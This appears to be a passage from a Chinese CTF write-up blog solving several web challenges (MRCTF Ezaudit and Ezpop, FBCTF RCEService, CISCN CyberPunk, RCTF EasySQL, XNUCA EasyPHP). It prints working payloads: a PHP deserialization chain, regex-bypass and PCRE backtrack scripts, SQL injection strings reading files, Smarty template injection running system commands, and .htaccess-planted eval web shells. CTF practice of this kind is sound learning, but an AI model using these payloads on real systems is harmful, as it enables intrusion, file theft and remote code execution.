 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```
第一个if判断：
**php会把空格( )或者点（.）自动替换成下划线(_)，绕过方法：**
1. %5F
2. b.u.p.t（点代替_）
3. b u p t（空格代替_）

这个题ban掉了`_`的编码值`%5f`，可以用另外两种来解
第二个if判断：
prep_match()正则匹配，使用`%0a`换行污染绕过

最终Payload：`b u p t=23333%0a` 或 `b.u.p.t=23333%0a`
![](https://img-blog.csdnimg.cn/20200413142314527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
进入secrettw.php查看源码得到JsFuck，放入F12运行
![](https://img-blog.csdnimg.cn/20200413142537898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
POST一个`Merak=1`,得到源码：
```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>  
```
首先使用data伪协议`?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=`
![](https://img-blog.csdnimg.cn/20200413143105933.png)
然后伪造ip，发现Client-IP可以使用，`Client-IP: 127.0.0.1`

最后解密部分，使用师傅的脚本：
```php
<?php
  function enc($payload){ 
      for($i=0; $i<strlen($payload); $i++){
        $re .= chr(ord($payload[$i])-$i*2);  
      }
      return base64_encode($re);  
  }
  echo enc('flag.php');
  //flag.php加密后得到：ZmpdYSZmXGI=
?>
```
最后传入`?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&file=ZmpdYSZmXGI=`
![](https://img-blog.csdnimg.cn/20200413144441450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
或者不使用base64编码也可以`?2333=data://text/plain,todat is a happy day&file=ZmpdYSZmXGI=`
参考：[烨：[MRCTF]Web WriteUp](https://www.cnblogs.com/yesec/p/12616923.html)
[Y1ng：MRCTF 2020 Writeup](https://www.gem-love.com/ctf/2184.html#Ezpop)

## [MRCTF2020]Ezaudit
首先扫描目录，发现源码泄露，有`www.zip`，和一个登录页面login.html。下载得到index.php：
```php
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
```
有三个参数： `username（crispr)`，`password（万能密码)`，`Private_key（私钥）`
我们首先用脚本将伪随机数转换成php_mt_seed可以识别的数据，并爆破出mt_rand()的种子。
```python
str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
str2='KVQP0LdJKRaV3n9D'
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print (res)
```
![](https://img-blog.csdnimg.cn/20200413174919974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到数据：
```javascript
36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
```
使用我们的php_mt_seed爆破得到种子
![](https://img-blog.csdnimg.cn/20200413175444981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到`seed = 0x69cf57fb = 1775196155 (PHP 5.2.1 to 7.0.x; HHVM)`
最后使用脚本爆破私钥
```php
<?php
mt_srand(1775196155);
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

 function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
echo public_key()."\n";
echo private_key();
?>
```
最后在php版本为7.0.33得到私钥`XuNhoueCDCGc`
![](https://img-blog.csdnimg.cn/20200413181133148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200413181244889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在login.html登录获得flag
![](https://img-blog.csdnimg.cn/20200413181602745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[烨：[MRCTF]Web WriteUp](https://www.cnblogs.com/yesec/p/12616923.html)

## [MRCTF2020]Ezpop
题目给出了源代码：(官方解释如下)
```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);//8.触发这个include，利用php base64 wrapper 读flag
    }
    public function __invoke(){
        $this->append($this->var);//7.然后会调用到这里
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;//4.这里会调用str->source的__get 那么我们将其设置为Test对象
    }

    public function __wakeup(){//2.如果pop是个Show,那么调用这里
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {//3.匹配的时候会调用__toString
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;//5.触发到这里
        return $function();//6.()会调用__invoke,我们这里选择Modifier对象
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);//1.反序列调用这里
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```
PHP魔术方法：
>` __construct()`  //当一个对象创建时被调用
` __destruct()`  //当一个对象销毁时被调用
` __toString() `  //当一个对象被当作一个字符串使用
` __sleep()  `//在对象在被序列化之前运行
` __wakeup() ` //将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
` __get()`  //获得一个类的成员变量时调用
` __set()`  //设置一个类的成员变量时调用
` __invoke() ` //调用函数的方式调用一个对象时的回应方法
` __call()`  //当调用一个对象中的不能用的方法的时候就会执行这个函数

构造pop链：
`调用__wakeup()->触发__tostring()->source属性不存在，触发Test类的__get()函数 -> 触发__invoke()函数 -> include()包含文件(伪协议) `
师傅exp代码如下：
```php
<?php 
class Modifier{
    protected $var;
    function __construct(){
        $this->var="php://filter/convert.base64-encode/resource=flag.php";
    }
}

class Test{
    public $p;
}

class Show{
    public $source;
    public $str;
}

$s = new Show();
$t = new Test();
$r = new Modifier();
$t->p = $r;
$s->str = $t;
$s->source = $s;
echo urlencode(serialize($s));
```
运行得到，传入即可：
`O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D`
![](https://img-blog.csdnimg.cn/20200525191553812.png)
![](https://img-blog.csdnimg.cn/20200525191628898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[烨：[MRCTF]Web WriteUp](https://www.cnblogs.com/yesec/p/12616923.html)

## [FBCTF2019]RCEService

首先查看文件夹文件，
```cmd
{"cmd":"ls"}
```
![](https://img-blog.csdnimg.cn/20200413222205103.png)
然后输入其他的发现被ban了，看wp得源码
```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
?>
```

**非预期：**
preg_match只能匹配第一行数据，所以用换行符`%0a`换行，然后发现没有cat命令，是由于应用程序的PATH变量更改了
最终payload：
```java
{%0a"cmd":"/bin/cat /home/rceservice/flag"%0a}//路径是找出来的
```
![](https://img-blog.csdnimg.cn/20200413223414981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
**预期**
p神文章：[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
正则回溯最大只有1000000，如果回溯次数超过就会返回flase，构造1000000个a，使回溯超过限制就会绕过正则匹配
payload：
```python
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'
res = requests.post("http://0e383195-1074-4c91-ba06-2b4029dcd921.node3.buuoj.cn/", data={"cmd":payload})
#print(payload)
print(res.text)
```
![](https://img-blog.csdnimg.cn/20200413225641569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[W4nder：[FBCTF2019]RCEService](https://blog.csdn.net/chasingin/article/details/104398092)
[BUUCTF：[FBCTF2019]RCEService](http://www.luyixian.cn/news_show_308615.aspx)

## [CISCN2019 华北赛区 Day1 Web5]CyberPunk
查看源码得到信息
![](https://img-blog.csdnimg.cn/20200414183649797.png)
那么应该是文件包含，尝试payload：
`?file=php://filter/convert.base64-encode/resource=index.php`
![](https://img-blog.csdnimg.cn/20200414184001254.png)
解码即可得到源代码：
```php
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```
那么可以得到confirm.php,change.php,search.php等等的源码
**change.php：**
```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```
**search.php：**
```php
<?php

require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```
**confirm.php：**
```php
<?php

require_once "config.php";
//var_dump($_POST);

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>
```
每个涉及查询的界面都过滤了很多东西来防止SQL注入，但发现在change.php中address只是进行了简单的转义。如果第一次修改地址的时候，构造一个含SQL语句特殊的payload，然后在第二次修改的时候随便更新一个正常的地址，那个之前没有触发SQL注入的payload就会被触发
payload：
`1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#`
![](https://img-blog.csdnimg.cn/2020041419034889.png)
`1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),21,50)),0x7e),1)#`
![](https://img-blog.csdnimg.cn/20200414190803598.png)
赛博朋克2077买买买！！！
参考：[ciscn2019华北赛区半决赛day1web5CyberPunk](https://www.cnblogs.com/kevinbruce656/p/11347127.html)

## [BSidesCF 2019]Futurella
一开始一脸懵逼
![](https://img-blog.csdnimg.cn/20200414201820469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看源代码得到flag。。。。。。what！！！！！！！
![](https://img-blog.csdnimg.cn/20200414201905840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
正常来说：google翻译，按照翻译出来的中文翻译成英文，与符号相对应，很自然的就找到了对应关系，而且还根据符号的大小区分了大小写，最后拼接直接得到flag
![](https://img-blog.csdnimg.cn/20200414202350717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
可参考：[2019年CTF3月比赛记录（一）：BSidesSF 2019 CTF_Web部分题目writeup与重解](https://blog.csdn.net/qq_43214809/article/details/88169071)

## [CISCN2019 华东南赛区]Web11
首先进入发现在右上角记录了ip
![](https://img-blog.csdnimg.cn/2020041421232892.png)
然后在最后面发现是基于Smarty模板
![](https://img-blog.csdnimg.cn/20200414212247261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
抓包伪造XFF头试试，设置`X-Forwarded-For: {7+7}`
![](https://img-blog.csdnimg.cn/20200414212729589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
smarty中的if标签中可以执行php语句，那么可以使用：
```php
{if system("ls /")}{/if}
{if system("cat /flag")}{/if}
或者
{if readfile('/flag')}{/if}
```
![](https://img-blog.csdnimg.cn/20200414213225547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[[CISCN2019 华东南赛区]Web11](https://www.cnblogs.com/Wanghaoran-s1mple/p/12616892.html)

## [BSidesCF 2019]Kookie
![](https://img-blog.csdnimg.cn/20200415233223695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
一开始以为是弱密码或者是万能密码，后来发现都不对，提示有cookie还是抓包，但并未发现什么。
看wp发现只要在cookie处加入：`username=admin`即可 ？？？？？
![](https://img-blog.csdnimg.cn/20200415234008127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[2019年CTF3月比赛记录（一）：BSidesSF 2019 CTF_Web部分题目writeup与重解](https://blog.csdn.net/qq_43214809/article/details/88169071)

## [RCTF2015]EasySQL
**考点为二次注入**
首先注册一个`'sss"\`测试一下，在修改密码处有一个报错的回显
![](https://img-blog.csdnimg.cn/20200416000008667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
猜测sql语句
```sql
select * from user where username="'sss"\" and password='d41d8cd98f00b204e9800998ecf8427e'
```
那么进行报错注入

```sql
username=1"||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#
```
![](https://img-blog.csdnimg.cn/20200416000400506.png)
这个题目flag不在flag 表中。。。。。。。查看users表
```sql
username=1"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1))#
```
![](https://img-blog.csdnimg.cn/20200416000632452.png)
发现有长度限制，并没有显示全面，使用正则匹配
```sql
username=1"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1))#
```
得到列为`real_flag_1s_here`，最后爆数据
```sql
username=1"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#
```
![](https://img-blog.csdnimg.cn/202004160012488.png)
长度受到限制，使用`reverse`逆序输出
```sql
username=1"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
```
![](https://img-blog.csdnimg.cn/20200416002125454.png)
使用python的切片，步长为-1,来得到正向的flag，拼接即可
![](https://img-blog.csdnimg.cn/20200416002731415.png)

参考：[[RCTF2015]EasySQL](https://www.cnblogs.com/peri0d/p/11599643.html)

## [BSidesCF 2020]Had a bad day
![](https://img-blog.csdnimg.cn/2020041600371287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
进入点击发现是猫狗的图片，看url发现可能是文件包含
使用伪协议读取index的源代码
`?category=php://filter/read=convert.base64-encode/resource=index`
![](https://img-blog.csdnimg.cn/20200416003926732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到有用代码：
```php
 <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```
利用include函数特性包含一下flag.php文件
`?category=woofers/../flag`
![](https://img-blog.csdnimg.cn/20200416004833838.png)
说明flag.php被包含了进去，接下来读取flag.php，看wp知道php://filter伪协议可以套一层协议
**法一：**
`?category=php://filter/read=convert.base64-encode/meowers/resource=flag`
利用了PHP对不存在过滤器的容错性，虽然会报warning，但是还是输出了结果。
**法二：**
`?category=php://filter/read=convert.base64-encode/resource=meowers/../flag`
利用了PHP会对路径进行规范化处理
![](https://img-blog.csdnimg.cn/20200416005226432.png)
参考：
[[BUUOJ记录] [BSidesCF 2020]Had a bad day](https://www.cnblogs.com/yesec/p/12577515.html)
[BSidesSF 2020 CTF writeup](https://zhuanlan.zhihu.com/p/113862487)

## [XNUCA2019Qualifier]EasyPHP
给出了源码：
```php
 <?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?> 
```
### 预期解
**htaccess生效**
如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance 这里采用`# \`的方式将换行符转义成普通字符，就可以用#来注释单行了。
**利用文件包含**
代码中有一处`include_once("fl3g.php");` php的配置选项中有include_path可以用来设置include的路径。如果tmp目录下有fl3g.php，在可以通过将include_path设置为tmp的方式来完成文件包含。
**tmp目录写文件**
1. 如何在指定目录写指定文件名的文件呢？php的配置选项中有error_log可以满足这一点。error_log可以将php运行报错的记录写到指定文件中。
2. 如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，而如果fl3g.php存在，则会因为include_path默认先访问web目录而不会报错。
3. 写进error_log的内容会被html编码怎么绕过？这个点是比较常见的，采用utf7编码即可。

payload：
第一步：通过error_log配合include_path在tmp目录生成shell
写入utf-7编码的shellcode可以绕过<?的过滤，编码后的语句为：`<?php eval($_GET[1]); __halt_compiler();`
![](https://img-blog.csdnimg.cn/20200416173108223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path "+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs"
# \
```
在传值的时候一定要进行url编码才可以成功
```php
?filename=.htaccess&content=php_value%20error_log%20%2ftmp%2ffl3g.php%0aphp_value%20error_reporting%2032767%0aphp_value%20include_path%20%22%2bADw?php%20eval($_GET[1])%2bADs%20%2bAF8AXw-halt%2bAF8-compiler()%2bADs%22%0a%23%20%5c
```

第二步：访问index.php留下error_log
第三步：通过include_path和utf7编码执行shell
```php
php_value include_path "/tmp"
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# \
```
同理传入：
```php
?filename=.htaccess&content=php_value%20include_path%20%22/tmp%22%0aphp_value%20zend.multibyte%201%0aphp_value%20zend.script_encoding%20%22UTF-7%22%0a%23%20%5c
```
最后通过一句话来执行php命令
![](https://img-blog.csdnimg.cn/20200417102202139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
再传一遍得到flag
![](https://img-blog.csdnimg.cn/20200513225924437.png)
### 非预期解
一：
因为正则判断写的是`if(preg_match("/[^a-z\.]/", $filename) == 1)` 而不是`if(preg_match("/[^a-z\.]/", $filename) !== 0)` ，可以通过 php_value 设置正则回朔次数来使正则匹配的结果返回为 false 而不是 0 或 1, 默认的回朔次数比较大, 可以设成 0, 那么当超过此次数以后将返回 false，通过设置.htaccess：
```php
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
# \
```
传入：
```php
?filename=.htaccess&content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23%20%5c
```
filename即可通过伪协议绕过前面stristr的判断实现Getshell，令filename为：
`?filename=php://filter/write=convert.base64-decode/resource=.htaccess`
这样content就能绕过stristr，一般这种基于字符的过滤都可以用编码进行绕过，这样就能getshell了
```php
php_value pcre.backtrack_limit 0
php_value auto_append_file ".htaccess"
php_value pcre.jit 0
#aa<?php eval($_GET['a']);?>\
```
我这里没有成功，不清楚了。。。
二：
反斜杠有拼接上下两行的功能，因此这里本来就可以直接使用`\`来连接被过滤掉的关键字来写入.htaccess
```php
php_value auto_prepend_fi\
le ".htaccess"
#<?php @eval($_GET['cmd']); ?>\
```
传入url编码过的字符串
```php
?filename=.htaccess&content=php_value%20auto_prepend_fi%5c%0ale%20%22.htaccess%22%0a%23%3c%3fphp%20%40eval(%24_GET%5b'cmd'%5d)%3b%20%3f%3e%5c
```
即可在index里面执行命令了
![](https://img-blog.csdnimg.cn/20200513223511162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
